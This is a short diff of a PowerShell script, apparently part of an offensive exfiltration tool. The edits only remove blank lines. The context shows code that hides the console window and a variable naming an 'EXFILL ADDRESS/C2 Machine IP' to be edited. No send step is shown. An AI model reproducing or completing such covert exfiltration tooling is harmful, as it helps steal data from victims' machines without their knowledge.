@@ -1,5 +1,4 @@
 # .Net methods for hiding/showing the console in the background
-
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
@@ -14,7 +13,6 @@ function Hide-Console
     [Console.Window]::ShowWindow($consolePtr, 0)
 }
 Hide-Console
-
 
 # EXFILL ADDRESS/C2 Machine IP Address (PLEASE EDIT THIS!!)
 $exfilServer = "192.168.200.2"
